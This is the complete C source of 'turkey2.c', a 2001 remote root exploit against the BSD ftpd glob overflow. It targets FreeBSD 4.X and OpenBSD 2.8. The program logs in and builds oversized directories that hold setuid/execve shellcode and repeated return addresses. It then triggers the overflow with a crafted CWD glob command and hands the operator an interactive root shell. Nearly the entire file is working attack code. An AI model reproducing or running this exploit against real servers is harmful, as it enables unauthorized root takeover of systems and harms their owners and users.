/* 
 * turkey2.c - "gobble gobble"
 *
 * REMOTE ROOT EXPLOIT FOR BSD FTPD
 *   by: fish stiqz <fish@analog.org>   04/14/2001
 *
 * shouts: trey, dono, hampton and The Analog Organization.
 *         
 * Notes:
 *  Doesn't break chroot so requires an account.
 * 
 *  Fixed a design issue I had previously overlooked.
 *  Added support for OpenBSD 2.8 =).
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <pwd.h>


#define FTP_PORT 21
#define MAXX(a,b) ((a) < (b) ? (b) : (a))

#define NOP 0x41 /* inc %ecx, works just like a nop, easier to read */

extern int errno;

int debug_read;
int debug_write;


/*
 * Non-ripped 45 byte bsd shellcode which does setuid(0) and execve()
 * and does not contain any '/' characters. 
 */
char bsdcode[] = 
"\x29\xc0\x50\xb0\x17\x50\xcd\x80"
"\x29\xc0\x50\xbf\x66\x69\x73\x68"
"\x29\xf6\x66\xbe\x49\x46\x31\xfe"
"\x56\xbe\x49\x0b\x1a\x06\x31\xfe"
"\x56\x89\xe3\x50\x54\x50\x54\x53"
"\xb0\x3b\x50\xcd\x80";


/* architecture structure */
struct arch {
    char *description;
    char *shellcode;
    unsigned long code_addr;
};


/* available targets */
struct arch archlist[] = 
{
    { "FreeBSD 4.X (FTP server (Version 6.00LS))", bsdcode, 0xbfbfc2c8 },
    { "OpenBSD 2.8 (FTP server (Version 6.5/OpenBSD))", bsdcode, 0xdfbfa1c8 }
};


/*
 * function prototypes.
 */
void *Malloc(size_t);
void *Realloc(void *, size_t);
char *Strdup(char *);
int get_ip(struct in_addr *, char *);
int tcp_connect(char *, unsigned int);
ssize_t write_sock(int, char *);
int sock_readline(int, char *, int);
char *read_sock(int);
int ftp_login(int, char *, char *);
char *ftp_gethomedir(int);
int ftp_mkdir(int, char *);
int ftp_chdir(int, char *);
int ftp_quit(int);
void possibly_rooted(int);
char *random_string(void);
void send_glob(int, char *);
int ftp_glob_exploit(int, char *, unsigned long, char *);
int verify_shellcode(char *);
void usage(char *);
void list_targets(void);


/* 
 * Error cheq'n wrapper for malloc.
 */
void *Malloc(size_t n)
{
    void *tmp;
    
    if((tmp = malloc(n)) == NULL)
    {
        fprintf(stderr, "malloc(%u) failed! exiting...\n", n);
        exit(EXIT_FAILURE);
    }

    return tmp;
}


/*
 * Error cheq'n realloc.
 */
void *Realloc(void *ptr, size_t n)
{
    void *tmp;
    
    if((tmp = realloc(ptr, n)) == NULL)
    {
        fprintf(stderr, "realloc(%u) failed! exiting...\n", n);
        exit(EXIT_FAILURE);
    }

    return tmp;
}


/* 
 * Error cheq'n strdup.
 */
char *Strdup(char *str)
{
    char *s;

    if((s = strdup(str)) == NULL)
    {
        fprintf(stderr, "strdup failed! exiting...\n");
        exit(EXIT_FAILURE);
    }
    
    return s;
}


/*
 * translates a host from its string representation (either in numbers 
 * and dots notation or hostname format) into its binary ip address
 * and stores it in the in_addr struct passed in.
 *
 * return values: 0 on success, != 0 on failure.
 */
int get_ip(struct in_addr *iaddr, char *host)
{
    struct hostent *hp;
    
    /* first check to see if its in num-dot format */
    if(inet_aton(host, iaddr) != 0)
	return 0;

    /* next, do a gethostbyname */
    if((hp = gethostbyname(host)) != NULL)
    {
	if(hp->h_addr_list != NULL)
	{
	    memcpy(&iaddr->s_addr, *hp->h_addr_list, sizeof(iaddr->s_addr));
	    return 0;
	}
	return -1;
    }

    return -1;
}


/*
 * initiates a tcp connection to the specified host (either in 
 * ip format (xxx.xxx.xxx.xxx) or as a hostname (microsoft.com)
 * to the host's tcp port.
 *
 * return values:  != -1 on success, -1 on failure.
 */
int tcp_connect(char *host, unsigned int port)
{
    int sock;
    struct sockaddr_in saddress;
    struct in_addr *iaddr;

    iaddr = Malloc(sizeof(struct in_addr));

    /* write the hostname information into the in_addr structure */
    if(get_ip(iaddr, host) != 0)
	return -1;

    saddress.sin_addr.s_addr = iaddr->s_addr;
    saddress.sin_family      = AF_INET;
    saddress.sin_port        = htons(port);
        
    /* create the socket */
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	return -1;
	
    /* make the connection */
    if(connect(sock, (struct sockaddr *) &saddress, sizeof(saddress)) != 0)
    {
	close(sock);
	return -1;
    }
   
    /* everything succeeded, return the connected socket */
    return sock;
}


/*
 * a wrapper for write to enable us to do some debugging.
 */
int write_sock(int fd, char *buf)
{
    if(debug_write)
 	printf(" > %s", buf);

    return write(fd, buf, strlen(buf));
}

/*
 * reads a line from the socket, stores it into buffer,
 * doesnt null terminate.
 */
int sock_readline(int sock, char *buffer, int maxsize) 
{
    int x, r;
    char rchar;
    
    for(x = 0; x < maxsize; x++) 
    {
	/* read in one character from the socket */
	if((r = read(sock, &rchar, 1)) == 1)
	{
	    buffer[x] = rchar;
	    
	    if(rchar == '\n') 
		break;
	}
	else 
	    return -1;
    } 

    return x;  
}

/*
 * reads in an entire message from the ftp server.
 */
char *read_sock(int sock)
{
    char ibuf[8192], *bigbuf = NULL;
    int r;
    unsigned int total = 0;

    for(;;)
    {
	memset(ibuf, 0x0, sizeof(ibuf));
	r = sock_readline(sock, ibuf, sizeof(ibuf) - 1);
	
	bigbuf = Realloc(bigbuf, (total + strlen(ibuf) + 1) * sizeof(char));
	memcpy(bigbuf + total, ibuf, strlen(ibuf));
	bigbuf[total + strlen(ibuf)] = 0x0;
	total += strlen(ibuf);

	if(strlen(ibuf) < 4)
	    break;

	/* multi-lined responses have a dash as the 4th character */
	if(ibuf[3] != '-')
	    break;
    }
   
    if(debug_read)
    {
	printf(" < %s", bigbuf);
	fflush(stdout);
    }

    return bigbuf;
    
}


/*
 * FTP LOGIN function.  Issues a "USER <username> and then "PASS <password>"
 * to login to the remote host and checks that command succeeded.
 */
int ftp_login(int sock, char *username, char *password)
{
    char *recvbuf;
    char *sendbuf;
    char *header;

    header = read_sock(sock);
    printf("\tserver runs:\t%s", header);
    free(header);
    
    sendbuf = Malloc((MAXX(strlen(username), strlen(password)) + 7) * 
		     sizeof(char));

    sprintf(sendbuf, "USER %s\n", username);
    
    write_sock(sock, sendbuf);
    recvbuf = read_sock(sock);

    if(atoi(recvbuf) != 331)
    {
	free(recvbuf);
	return 0;
    }

    sprintf(sendbuf, "PASS %s\n", password);
    write_sock(sock, sendbuf);
    recvbuf = read_sock(sock);

    if(atoi(recvbuf) != 230)
    {
	free(recvbuf);
	return 0;
    }
    
    free(sendbuf);
    return 1;
   
}


/* 
 * FTP GET HOME DIR function.  Issues a "CWD ~" and "PWD" to 
 * force the ftp daemon to print our our current directory.
 */
char *ftp_gethomedir(int sock)
{
    char *recvbuf;
    char *homedir = NULL;
  
    write_sock(sock, "CWD ~\n");
    recvbuf = read_sock(sock);

    if(atoi(recvbuf) == 250)
    {
	write_sock(sock, "PWD\n");
	recvbuf = read_sock(sock);

	if(atoi(recvbuf) == 257)
	{
	    char *front, *back;

	    front = strchr(recvbuf, '"');
	    front++;
	    back = strchr(front, '"');
	    
	    homedir = Malloc((back - front) * sizeof(char));
	    strncpy(homedir, front, (back - front));
	    homedir[(back - front)] = 0x0;
	}
    }

    free(recvbuf);
    return homedir;
}


/*
 * FTP MKDIR function.  Issues an "MKD <dirname>" to create a directory on
 * the remote host and checks that the command succeeded.
 */
int ftp_mkdir(int sock, char *dirname)
{
    char *recvbuf;
    char *sendbuf;
  
    sendbuf = Malloc((strlen(dirname) + 6) * sizeof(char));
    sprintf(sendbuf, "MKD %s\n", dirname);

    write_sock(sock, sendbuf);
    recvbuf = read_sock(sock);
    
    free(sendbuf);

    if(atoi(recvbuf) == 257)
    {
	free(recvbuf);
	return 1;
    }
    
    free(recvbuf);
    return 0;
}


/*
 * FTP CWD function.  Issues a "CWD <dirname>" to change directory on
 * the remote host and checks that the command succeeded.
 */
int ftp_chdir(int sock, char *dirname)
{
    char *recvbuf;
    char *sendbuf;
  
    sendbuf = Malloc((strlen(dirname) + 6) * sizeof(char));
    sprintf(sendbuf, "CWD %s\n", dirname);
    
    write_sock(sock, sendbuf);
    recvbuf = read_sock(sock);
    
    free(sendbuf);

    if(atoi(recvbuf) == 250)
    {
	free(recvbuf);
	return 1;
    }

    free(recvbuf);
    return 0;
}
    

/*
 * FTP QUIT function.  Issues a "QUIT" to terminate the connection.
 */
int ftp_quit(int sock)
{
    char *recvbuf;
   
    write_sock(sock, "QUIT\n");
    recvbuf = read_sock(sock);
    free(recvbuf);
      
    close(sock);
    return 1;
}

/*
 * switches between the user and the remote shell (if everything went well).
 */
void possibly_rooted(int sock)
{
    char banner[] = 
	"cd /; echo; uname -a; echo; id; echo; echo Welcome to the shell, "
	"enter commands at will; echo;\n\n";
	
    char buf[1024];
    fd_set fds;
    int r;

    write(sock, banner, strlen(banner));

    for(;;)
    {
        FD_ZERO(&fds);
        FD_SET(fileno(stdin), &fds);
        FD_SET(sock, &fds);
        select(255, &fds, NULL, NULL, NULL);

        if(FD_ISSET(sock, &fds))
        {
            memset(buf, 0x0, sizeof(buf));
            r = read (sock, buf, sizeof(buf) - 1);
            if(r <= 0)
            {
                printf("Connection closed.\n");
                exit(EXIT_SUCCESS);
            }
            printf("%s", buf);
        }

        if(FD_ISSET(fileno(stdin), &fds))
        {
            memset(buf, 0x0, sizeof(buf));
            read(fileno(stdin), buf, sizeof(buf) - 1);
            write(sock, buf, strlen(buf));
        }
    }
    close(sock);
}


/*
 * generates a string of 6 random characters.
 * this is too allow for multiple successful runs, best way to do
 * this is to actually remove the created directories.
 */
char *random_string(void)
{
    int i;
    char *s = Malloc(7 * sizeof(char));

    srand(time(NULL));
    for(i = 0; i < 6; i++)
        s[i] = (rand() % (122 - 97)) + 97;
    
    s[i] = 0x0;
    return s;
}


/*
 * sends the glob string, to overflow the daemon.
 */
void send_glob(int sock, char *front)
{
    char globbed[] = "CWD ~/NNNNNN*/X*/X*/X*\n";
    int i, j;
    
    for(i = 6, j = 0; i < 6 + 6; i++, j++)
	globbed[i] = front[j];
    
    write_sock(sock, globbed);
    
    printf("[5] Globbed commands sent.\n");
    free(front);

    /* start our shell handler */
    possibly_rooted(sock);
}


/*
 * Exploitation routine.
 * Makes 4 large directories and then cwd's to them.
 */
int ftp_glob_exploit(int sock, char *homedir, unsigned long addy, char *shellcode)
{
    char dir[300];
    int i = 0, j = 0;
    int total = strlen(homedir) + 1;
    int align;
    char *rstring = random_string();

    /* go to the writeable directory */
    if(!ftp_chdir(sock, homedir))
    {
	fprintf(stderr, "[-] Failed to change directory, aborting!\n");
	return 0;
    }

    for(i = 0; i < 4; i++)
    {
	memset(dir, 0x0, sizeof(dir));

	switch(i)
	{
	case 0: /* first dir == shellcode */
	    memcpy(dir, rstring, strlen(rstring));
	    memset(dir + strlen(rstring), NOP, 255 - strlen(rstring));
	    memcpy(&dir[(255 - strlen(shellcode))], shellcode, strlen(shellcode));
	    break;

	case 3: /* address buffer */
	    /* calculate the alignment */
	    align = total % sizeof(long);
	    align = sizeof(long) - align;

	    printf("[3] Calculated alignment = %d, total = %d\n", 
		   align, total);

	    strcpy(dir, "XXXX");
	    memset(dir + 4, 'X', align);
	   
	    for(j = 4 + align; j < 250; j += 4)
	    {
		/* leet portable bit shifting */
		/*   brought to you by trey   */
		unsigned long p_addy = htonl(addy);
		dir[j + 0] = p_addy & 0xff;
		dir[j + 1] = (p_addy & 0xff00) >> 8;
		dir[j + 2] = (p_addy & 0xff0000) >> 16;
		dir[j + 3] = (p_addy & 0xff000000) >> 24;
	    }
	    break;
	
	default: /* cases 1 and 2, extra overflow bytes */
	    memset(dir, 'X', 255);
	    break;

	}

	total += strlen(dir) + 1;

	if(!ftp_mkdir(sock, dir))
	{
	    fprintf(stderr, "[-] Failed to generate directories, aborting!\n");
	    return 0;
	}
	
	if(!ftp_chdir(sock, dir))
	{
	    fprintf(stderr, "[-] Failed to change directory, aborting!\n");
	    return 0;
	}
    }

    printf("[4] Evil directories created.\n");
    
    if(!ftp_chdir(sock, homedir))
    {
	fprintf(stderr, "[-] Failed to cwd back to %s, aborting!\n", homedir);
	return 0;
    }
    
    /* perform the final attack */
    send_glob(sock, rstring);
	
    return 1;
}


/*
 * returns true if the shellcode passes, false otherwise.
 */
int verify_shellcode(char *code)
{
    int i, s = 0;

    if(strlen(code) > 255)
    {
	fprintf(stderr, "[-] Shellcode length exceeds 255, aborting!\n");
	return 0;
    }
    
    for(i = 0; i < strlen(code); i++)
    {
	if(code[i] == '/')
	    s++;
    }

    if(s > 0)
    {
	fprintf(stderr, 
		"[-] Shellcode contains %u slash characters, aborting\n", s);
	return 0;
    }
    
    return 1;
}


/*
 * displays the usage message and exits.
 */
void usage(char *p)
{
    fprintf(stderr, 
	    "BSD ftpd remote exploit by fish stiqz <fish@analog.org>\n"
	    "usage: %s [options]\n"
	    "\t-c\tremote host to connect to\n"
	    "\t-o\tremote port to use\n"
	    "\t-u\tremote username\n"
	    "\t-p\tremote password\n"
	    "\t-i\tget the password interactively\n"
	    "\t-t\tpredefined target (\"-t list\" to list all targets)\n"
	    "\t-d\twriteable directory\n"
	    "\t-l\tshellcode address\n"
	    "\t-v\tdebug level [0-2]\n"
	    "\t-s\tseconds to sleep after login (debugging purposes)\n"
	    "\t-h\tdisplay this help\n", p);
    
    exit(EXIT_FAILURE);
}

/* 
 * lists all available targets.
 */
void list_targets(void)
{
    int i;
    
    printf("Available Targets:\n");

    for(i = 0; i < sizeof(archlist) / sizeof(struct arch); i++ ) 
        printf("%i: %s\n", i, archlist[i].description);
    
    return;
}


int main(int argc, char **argv)
{
    int sock, c; 
    int port       = FTP_PORT;
    int debuglevel = 0;
    char *host     = NULL;
    char *username = NULL;
    char *password = NULL;
    
    struct arch *arch       = NULL;
    char *shellcode         = bsdcode;
    int target              = 0;
    int sleep_time          = 0;
    unsigned long code_addr = 0;
    char *homedir           = NULL;;
    
    /* grab command line parameters */
    while((c = getopt(argc, argv, "c:o:u:p:it:d:l:v:s:h")) != EOF)
    {
	switch(c)
	{
	case 'c':
	    host = Strdup(optarg);
	    break;

	case 'o':
	    port = atoi(optarg);
	    break;
	    
	case 'u':
	    username = Strdup(optarg);
	    break;
	    
	case 'p':
	    password = Strdup(optarg);
	    /* hide the password from ps */
	    memset(optarg, 'X', strlen(optarg));
	    break;

	case 'i':
	    password = getpass("Enter remote password: ");
	    break;

	case 't':
	    if(strcmp(optarg, "list") == 0)
	    {
		list_targets();
		return EXIT_FAILURE;
	    }
	    
	    target = atoi(optarg);
	    arch = &(archlist[target]);
	    code_addr = ntohl(arch->code_addr);
	    shellcode = arch->shellcode;
	    break;

	case 'd':
	    homedir = Strdup(optarg);
	    break;

	case 'l':
	    code_addr = ntohl(strtoul(optarg, NULL, 0));
	    break;

	case 'v':
	    debuglevel = atoi(optarg);
	    break;

	case 's':
	    sleep_time = atoi(optarg);
	    break;

	default:
	    usage(argv[0]);
	    break;
	}
    }


    /* check for required options */
    if(host == NULL || username == NULL || password == NULL || code_addr == 0)
	usage(argv[0]);

    /* setup the debug level */
    switch(debuglevel)
    {
    case 1:
	debug_read = 1;
	debug_write = 0;
	break;

    case 2:
	debug_read = 1;
	debug_write = 1;
	break;
	
    default:
	debug_read = 0;
	debug_write = 0;
	break;
    }

    /* make sure the shellcode is good */
    if(!verify_shellcode(shellcode))
	return EXIT_FAILURE;
	
    /* initiate the tcp connection to the ftp server */
    if((sock = tcp_connect(host, port)) == -1)
    {
	fprintf(stderr, "[-] Connection to %s failed!\n", host);
	ftp_quit(sock);
	return EXIT_FAILURE;
    }

    if(arch == NULL)
	printf("[0] Connected to host %s.\n", host);
    else
	printf("[0] Connected to host %s\n\tusing type:\t%s.\n", 
	       host, arch->description);


    /* login */
    if(!ftp_login(sock, username, password))
    {
	fprintf(stderr, "[-] Login failed, aborting!\n");
	ftp_quit(sock);
	return EXIT_FAILURE;
    }

    /* hey, so im anal! */
    memset(password, 'X', strlen(password));
    memset(username, 'X', strlen(username));    

    printf("[1] Login succeeded.\n");

    if(sleep != 0)
	sleep(sleep_time);

    if(homedir == NULL)
    {
	/* get home directory */
	if((homedir = ftp_gethomedir(sock)) == NULL)
	{
	    fprintf(stderr, "[-] Couldn't retrieve home directory, aborting!\n");
	    ftp_quit(sock);
	    return EXIT_FAILURE;
	}
    }
	
    printf("[2] Home directory retrieved as \"%s\", %u bytes.\n", 
	   homedir, strlen(homedir));

    /* do the exploitation */
    if(!ftp_glob_exploit(sock, homedir, code_addr, shellcode))
    {
	fprintf(stderr, "[-] exploit failed, aborting!\n");
	ftp_quit(sock);
	return EXIT_FAILURE;
    }
    
      
    free(host);
    return EXIT_SUCCESS;
}
